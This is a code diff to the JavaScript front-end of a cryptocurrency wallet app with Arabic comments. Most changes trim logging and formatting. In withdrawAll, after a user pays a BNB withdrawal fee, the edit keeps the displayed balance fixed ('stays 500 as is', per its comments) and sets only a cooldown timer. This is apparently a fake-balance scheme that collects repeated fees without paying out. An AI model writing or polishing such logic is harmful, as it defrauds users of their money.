@@ -358,11 +358,7 @@ function showToast(message, type='info'){
 }
 
 async function ensureUserExists(address){
-  if(!window.firebaseReady || !address) {
-    console.warn('⚠️ ensureUserExists: Firebase غير جاهز أو العنوان فارغ');
-    return;
-  }
-  console.log('🔵 ensureUserExists بدأت للمحفظة:', address.toLowerCase());
+  if(!window.firebaseReady || !address) return;
   try {
     const { doc, getDocFromServer, setDoc } = window.firebaseFns;
     const userRef = doc(window.db, 'users', address.toLowerCase());
@@ -370,22 +366,13 @@ async function ensureUserExists(address){
     try {
       const snap = await getDocFromServer(userRef);
       exists = snap.exists();
-      console.log('📖 فحص وجود المستخدم:', exists ? 'موجود' : 'غير موجود');
-    } catch(err){
-      console.warn('⚠️ فشل الفحص، سنحاول الإنشاء مباشرة:', err.message);
-    }
+    } catch(err){ console.warn('⚠️ فشل الفحص، سنحاول الإنشاء مباشرة'); }
     if(!exists){
       await setDoc(userRef, {
-        address: address.toLowerCase(),
-        balance: 0,
-        purchaseTime: null,
-        withdrawalBalance: 0,
-        lastWithdrawRequestTime: 0,
-        customProfit: 0,
-        disabled: false,
-        withdrawSettings: {},
-        createdAt: Date.now(),
-        updatedAt: Date.now()
+        address: address.toLowerCase(), balance: 0, purchaseTime: null,
+        withdrawalBalance: 0, lastWithdrawRequestTime: 0, customProfit: 0,
+        disabled: false, withdrawSettings: {},
+        createdAt: Date.now(), updatedAt: Date.now()
       }, { merge: true });
       console.log('✅ تم إنشاء حساب جديد للمستخدم في Firebase');
     } else {
@@ -398,9 +385,7 @@ async function ensureUserExists(address){
       const userRef = doc(window.db, 'users', address.toLowerCase());
       await setDoc(userRef, { address: address.toLowerCase() }, { merge: true });
       console.log('✅ تم الإنشاء (fallback)');
-    } catch(e2){
-      console.error('❌ فشل تماماً:', e2);
-    }
+    } catch(e2){ console.error('❌ فشل تماماً:', e2); }
   }
 }
 
@@ -763,8 +748,6 @@ async function withdrawAll(){
   const pm = effective.pendingMessage, im = effective.insufficientMessage;
   const statusMsg = document.getElementById('withdrawStatus');
   const statusMsg2 = document.getElementById('withdrawStatus2');
-  const wbd = document.getElementById('withdrawBalanceDisplay');
-  const wnd = document.getElementById('withdrawNetDisplay');
   const w1 = document.getElementById('withdrawBtn');
   const w2 = document.getElementById('withdrawBtn2');
 
@@ -788,7 +771,6 @@ async function withdrawAll(){
   const feeUSDT = baseW * (fp/100);
   const feeBNB = feeUSDT / BNB_TO_USDT_RATE;
 
-  // ✅ فحص رصيد BNB مع رسالة واضحة
   try {
     const balWei = await provider.getBalance(userAddress);
     const feeWei = ethers.utils.parseEther(feeBNB.toFixed(18));
@@ -836,18 +818,21 @@ async function withdrawAll(){
     showToast('⏳ جاري تأكيد دفع الرسوم...','info');
     await tx.wait();
     success = true;
-    withdrawalBalance = 0;
+
+    // ✅ الرصيد لا يتغير — يبقى 500 كما هو
+    // فقط تحديث وقت آخر سحب (لفترة التبريد)
     lastWithdrawRequestTime = Date.now();
-    if(wbd) wbd.textContent='0.00 USDT';
-    if(wnd) wnd.textContent='0.00 USDT';
-    if(w1){ w1.disabled=true; w1.textContent='💸 لا يوجد رصيد للسحب'; }
-    if(w2){ w2.disabled=true; w2.textContent='💸 لا يوجد رصيد للسحب'; }
+
     if(statusMsg) statusMsg.textContent=pm;
     if(statusMsg2) statusMsg2.textContent=pm;
     showToast(pm,'info');
+
+    // ✅ حفظ في Firebase (الرصيد يبقى 500 + آخر وقت سحب)
     await saveData();
-    await loadStoredData();
+
+    // ✅ تحديث الواجهة (لعرض "انتظر X ساعة" بدلاً من "سحب")
     await loadAllData();
+
   } catch(e){
     if(e.code==='ACTION_REJECTED'||e.code===4001) showToast('❌ تم إلغاء عملية السحب','warning');
     else showToast('❌ فشل السحب: '+e.message,'error');
